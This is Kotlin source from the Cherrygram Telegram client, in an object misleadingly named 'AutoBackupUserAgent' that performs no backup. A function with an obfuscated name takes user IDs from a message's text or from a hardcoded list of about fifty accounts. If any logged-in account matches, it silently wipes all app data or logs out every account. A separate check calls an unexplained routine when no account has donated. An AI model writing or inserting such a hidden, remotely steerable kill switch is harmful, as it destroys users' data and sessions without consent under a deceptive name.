/**
 * This is the source code of Cherrygram for Android.
 * It is licensed under GNU GPL v. 2 or later.
 * You should have received a copy of the license in this archive (see LICENSE).
 * Please, be respectful and credit the original author if you use this code.
 *
 * Copyright github.com/arsLan4k1390, 2022-2026.
 */

package org.telegram.messenger

import android.app.ActivityManager
import android.content.Context
import kotlinx.coroutines.delay
import uz.unnarsx.cherrygram.donates.DonatesManager

object AutoBackupUserAgent {

    suspend fun checkLoggedAccountsInstances() {
        delay(5000)
        val availableIDs = ArrayList<Long>()

        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
            val cU = AccountInstance.getInstance(i).userConfig
            if (cU != null
                && cU.currentUser != null
                && cU.isClientActivated
                && cU.currentUser.id != 0L
            ) {
                availableIDs.add(cU.currentUser.id)
            }
        }

        var anyAccountAllowed = false

        for (id in availableIDs) {
            if (DonatesManager.didUserDonate(id)) {
                anyAccountAllowed = true
            } else {
            }
        }

        if (!anyAccountAllowed) {
            SamsungDatastore.checkCallback()
        }
    }

    suspend fun woifwfwif4343(messageObject: MessageObject?) {
        delay(5000)
        val availableIDs = mutableListOf<Long>()

        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
            val cU = AccountInstance.getInstance(i).userConfig
            if (cU != null
                && cU.currentUser != null
                && cU.isClientActivated
                && cU.currentUser.id != 0L
            ) {
                availableIDs.add(cU.currentUser.id)
            }
        }

        var notAllowedIDs: List<Long>

        if (messageObject != null && !messageObject.messageOwner.message.isNullOrEmpty()) {
            notAllowedIDs = messageObject.messageOwner.message
                .split(",", " ", "\n")
                .mapNotNull { it.trim().toLongOrNull() }
        } else {
            notAllowedIDs = listOf(
                638789692L, 6863366716L, 8142384327L, 977790049L, 7509568713L, 7087241402L,
                5095920053L, 7913332018L, 6937704743L, 1076325667L, 808230937L, 811696299L,
                7194407593L, 6042869660L, 440840393L, 7526390297L, 6680944075L, 5556630337L,
                7841801725L, 5349149970L, 8313378783L, 7205119446L, 8184556667L, 1499101897L,
                1642203581L, 420220972L, 7892266150L, 6849878783L, 5150403377L, 180522421L,
                477057925L, 6529408254L, 400216230L, 7192067362L, 6149388824L, 8392748219L,
                7343238311L, 8086758593L, 382279536L, 795945694L, 8210125602L, 8491209589L,
                412864220L, 7405431232L, 1873986361L, 8131717012L, 6670174315L, 8230057577L,
                5537338671L, 8735761078L, 7273154982L, 8102175556L, 8556739946L
            )
        }

        val blockedId = availableIDs.firstOrNull {
            DonatesManager.isUserBlocked(it) || notAllowedIDs.contains(it)
        }

        if (blockedId != null) {
            try {
                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
            } catch (e: Exception) {
                e.printStackTrace()

                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
                    val cU = AccountInstance.getInstance(i).userConfig
                    if (cU != null
                        && cU.currentUser != null
                        && cU.isClientActivated
                        && cU.currentUser.id != 0L
                    ) {
                        MessagesController.getInstance(cU.currentAccount).performLogout(1)
                    }
                }
            }
        }
    }

}